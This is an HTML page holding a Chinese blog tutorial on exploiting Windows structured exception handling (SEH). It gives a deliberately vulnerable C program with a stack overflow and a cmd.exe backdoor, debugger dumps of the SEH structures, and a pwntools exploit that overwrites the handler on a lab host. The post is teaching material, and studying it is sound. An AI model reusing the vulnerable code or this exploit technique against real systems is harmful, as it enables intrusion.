@@ -1,0 +1,370 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="这篇开始学习SEH  之前的文章链接：  win pwn初探（三） win pwn初探（二） win pwn初探（一）  win pwn初探（四）什么是SEH结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术，用于处理异常事件的程序控制结构 通俗易懂的来说就是__try,__except,__fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="win pwn初探（四）">
+<meta property="og:url" content="http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="这篇开始学习SEH  之前的文章链接：  win pwn初探（三） win pwn初探（二） win pwn初探（一）  win pwn初探（四）什么是SEH结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术，用于处理异常事件的程序控制结构 通俗易懂的来说就是__try,__except,__fi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/1.png">
+<meta property="article:published_time" content="2023-02-22T08:24:28.000Z">
+<meta property="article:modified_time" content="2023-02-22T00:54:06.514Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="win pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>win pwn初探（四）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/23/AFL-fuzz%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;text=win pwn初探（四）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（四）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=win pwn初探（四）&amp;body=Check out this article: http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;title=win pwn初探（四）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;name=win pwn初探（四）&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/&amp;t=win pwn初探（四）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（四）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSEH"><span class="toc-number">1.1.</span> <span class="toc-text">什么是SEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH%E9%87%8C%E9%9D%A2%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">SEH里面长什么样子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87SEH%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.</span> <span class="toc-text">如何通过SEH来控制程序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        win pwn初探（四）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-22T08:24:28.000Z" itemprop="datePublished">2023-02-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/win-pwn/" rel="tag">win pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="3">
+
+<blockquote>
+<p>这篇开始学习SEH</p>
+</blockquote>
+<p>之前的文章链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11913">win pwn初探（三）</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11891">win pwn初探（二）</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865">win pwn初探（一）</a></li>
+</ul>
+<h1 id="win-pwn初探（四）"><a href="#win-pwn初探（四）" class="headerlink" title="win pwn初探（四）"></a>win pwn初探（四）</h1><h2 id="什么是SEH"><a href="#什么是SEH" class="headerlink" title="什么是SEH"></a>什么是SEH</h2><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术，用于处理异常事件的程序控制结构</p>
+<p>通俗易懂的来说就是<code>__try,__except,__finally</code>这些东西</p>
+<h2 id="SEH里面长什么样子"><a href="#SEH里面长什么样子" class="headerlink" title="SEH里面长什么样子"></a>SEH里面长什么样子</h2><p>这个也困惑了我很长时间，网上的文献大部分都是直接讲的里面的结构体，不知道在程序里如果表现，如何通过调试去看这个SEH</p>
+<p>用下面的程序来调试，记得关掉SAFESEH</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> {</span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">}  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> z;</span><br><span class="line">	<span class="type">char</span> tmp[<span class="number">0x20</span>];</span><br><span class="line">	_try {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"0x%p\n"</span>, backdoor);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>, tmp);</span><br><span class="line">		z = x / y;</span><br><span class="line">	}</span><br><span class="line">	_except (<span class="number">1</span>) {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"seh"</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>z = x / y;</code>这里是除数是0引起的异常，所以正常运行之后还会输出seh</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004119B</span>0</span><br><span class="line">.text:<span class="number">004119B</span>0                               ; __unwind { <span class="comment">// __except_handler4</span></span><br><span class="line">.text:<span class="number">004119B</span>0 <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">004119B</span>1 <span class="number">8B</span> EC                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">004119B</span>3 <span class="number">6</span>A FE                         push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">004119B</span>5 <span class="number">68</span> C8 <span class="number">91</span> <span class="number">41</span> <span class="number">00</span>                push    offset stru_4191C8</span><br><span class="line">.text:<span class="number">004119B</span>A <span class="number">68</span> <span class="number">80</span> <span class="number">1F</span> <span class="number">41</span> <span class="number">00</span>                push    offset __except_handler4</span><br><span class="line">.text:<span class="number">004119B</span>F <span class="number">64</span> A1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             mov     eax, large fs:<span class="number">0</span></span><br><span class="line">.text:<span class="number">004119</span>C5 <span class="number">50</span>                            push    eax</span><br><span class="line">.text:<span class="number">004119</span>C6 <span class="number">81</span> C4 E8 FE FF FF             add     esp, <span class="number">0F</span>FFFFEE8h</span><br><span class="line">.text:<span class="number">004119</span>CC <span class="number">53</span>                            push    ebx</span><br><span class="line">.text:<span class="number">004119</span>CD <span class="number">56</span>                            push    esi</span><br><span class="line">.text:<span class="number">004119</span>CE <span class="number">57</span>                            push    edi</span><br></pre></td></tr></tbody></table></figure>
+
+<p>通过ida打开发现<code>push    offset __except_handler4</code>，这个是将处理结构异常函数的地址入栈</p>
+<p>用windbg打开此程序进行调试，在程序头下个断点</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    test!main:</span><br><span class="line"><span class="number">001419b</span>0 <span class="number">55</span>               push    ebp</span><br><span class="line"><span class="number">001419b</span>1 <span class="number">8b</span>ec             mov     ebp, esp</span><br><span class="line"><span class="number">001419b</span>3 <span class="number">6</span>afe             push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line"><span class="number">001419b</span>5 <span class="number">68</span>c8911400       push    <span class="number">1491</span>C8h</span><br><span class="line"><span class="number">001419b</span>a <span class="number">68801f</span>1400       push    <span class="number">141F</span>80h</span><br><span class="line"><span class="number">001419b</span>f <span class="number">64</span>a100000000     mov     eax, dword ptr fs:[<span class="number">00000000</span>h]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后dt去查看0x141F80这个定义</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt <span class="number">0x141F80</span></span><br><span class="line">_except_handler4</span><br><span class="line"> _EXCEPTION_DISPOSITION  test!_except_handler4+<span class="number">0</span>(</span><br><span class="line">	_EXCEPTION_RECORD*, </span><br><span class="line">	_EXCEPTION_REGISTRATION_RECORD*, </span><br><span class="line">	_CONTEXT*, </span><br><span class="line">	<span class="type">void</span>*)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以看到会接收4个参数输入，并且该异常处理函数由系统调用，是一个回调函数，看第一个参数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _EXCEPTION_RECORD</span><br><span class="line">test!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : Ptr32 _EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] Uint4B</span><br></pre></td></tr></tbody></table></figure>
+
+<p>重要的就两个<code>ExceptionCode</code>指出异常类型、<code>ExceptionFlags</code>表示发生异常的代码地址，接着看第二个参数</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">test!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION</span><br></pre></td></tr></tbody></table></figure>
+
+<p>该结构体主要用于描述线程异常处理句柄的地址，<code>Next</code>指向下一个结构的指针，<code>Handler</code>当前异常处理回调函数的地址，看一下非常经典的图</p>
+<img src="/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/1.png" alt="1" style="zoom:50%;">
+
+<p>TIB第一个字段就保存了SEH链表的头部指针，SEH链表中其他的节点存储在栈中，如果Next的成员的值为0xFFFFFFFF则表示在最后一个结点，当发生异常会按照顺序依次传递，直到有异常处理器处理</p>
+<p>接着看一下第三个参数<code>_CONTEXT</code></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _CONTEXT</span><br><span class="line">test!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Dr0              : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Dr1              : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> Dr2              : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> Dr3              : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> Dr6              : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Dr7              : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SegFs            : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> SegEs            : Uint4B</span><br><span class="line">   +<span class="number">0x098</span> SegDs            : Uint4B</span><br><span class="line">   +<span class="number">0x09c</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a0</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a4</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x0a8</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x0b0</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x0b4</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x0b8</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x0c4</span> Esp              : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>] UChar</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个结构体是用来备份CPU奇存器的值，因为多线程环境下需要这样做。每个线程内部都拥有1个CONTEXT结构体。CPU暂时离开当前线程去运行其他线程时，CPU寄存器的值就会保存到当前线程的CONTEXT结构体；CPU再次运行该线程时，会使用保存在CONTEXT结构体的值来覆盖CPU奇存器的值，然后从之前暂停的代码处继续执行。通过这种方式 ，OS可以在多线程环境下安全运行各线程</p>
+<p>在经典图那里有没有发现发生异常之后有一个TIB，那么TIB又是什么呢</p>
+<blockquote>
+<p><code>TIB</code>(<code>Thread Information Block</code>，线程信息块)是保存线程基本信息的数据结构，它存在于<code>x86</code>的机器上，它也被称为是<code>Win32</code>的<code>TEB</code>(<code>Thread Environment Block</code>，线程环境块)。<code>TIB/TEB</code>是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的<code>TIB/TEB</code></p>
+</blockquote>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _NT_TIB</span><br><span class="line">test!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第一个就是指向当前线程的SEH，<code>StackBase和StackLimit</code>分别指向当前线程所使用的栈的栈底和栈顶，<code>SubSystemTib</code>是子系统，<code>Self</code>指向自己</p>
+<h2 id="如何通过SEH来控制程序"><a href="#如何通过SEH来控制程序" class="headerlink" title="如何通过SEH来控制程序"></a>如何通过SEH来控制程序</h2><p>现在知识了SEH长什么样子了，但是如何通过SEH来攻击程序呢</p>
+<p>可以通过攻击程序的异常处理，想办法触发一个异常，程序就会转入异常处理，如果异常处理函数指针被我们覆盖，那么我们就可以通过劫持 SEH 来控制程序的后续流程</p>
+<p>也就是去覆盖上面的<code>_except_handler4</code>，如果把<code>_except_handler4</code>给覆盖成<code>backdoor</code>，在异常处理的时候就会去执行<code>backdoor</code>，现在还有一个问题那就是<code>_except_handler4</code>在栈上的哪个地方</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0x010ffc64</span> - <span class="number">0x64</span></span><br><span class="line"><span class="number">010f</span>fc00  <span class="number">77b</span>45f8b <span class="number">77</span>cfac49 <span class="number">010f</span>fc10 <span class="number">00000000</span>  ._.wI..w........</span><br><span class="line"><span class="number">010f</span>fc10  <span class="number">00000000</span> <span class="number">010f</span>fc2c <span class="number">51802922</span> <span class="number">1b</span>406328  ....,...<span class="string">").Q(c@.</span></span><br><span class="line"><span class="string">010ffc20  010ffc30 5179bff5 00000000 010ffc3c  0.....yQ....&lt;...</span></span><br><span class="line"><span class="string">010ffc30  010ffc40 517bffc6 00000000 00000000  @.....{Q........</span></span><br><span class="line"><span class="string">010ffc40  010ffc4c 517c02be 518e3074 010ffc60  L.....|Qt0.Q`...</span></span><br><span class="line"><span class="string">010ffc50  517ffbd2 010ffcd0 00141f80 001491c8  ...Q............</span></span><br><span class="line"><span class="string">010ffc60  fffffffe 010ffc84 00142403 00000001  .........$......</span></span><br><span class="line"><span class="string">010ffc70  012c4d88 012c9510 00000001 012c4d88  .M,...,......M,.</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>还是上面那个程序<code>0x010ffc64</code>是ebp，<code>0x141F80</code>是<code>_except_handler4</code>，可以看到在<code>ebp - 0xc</code>的地方是<code>_except_handler4</code>，刚好这个程序里有一个栈溢出，所以我们可以控制handler，程序开了GS保护但是没有用，因为先跑去处理异常了</p>
+<p>所以现在写exp来验证一下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'192.168.10.106'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">backdoor_addr = <span class="built_in">int</span>(r.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'backdoor_addr = '</span> + <span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x64</span> - <span class="number">0xc</span>) + p32(backdoor_addr)</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>弹了一个内存损坏的错误，点重试才可以利用成功，所以思考了一下内存损坏的错误也是在异常里，验证一下，把除0数学错误给去掉</p>
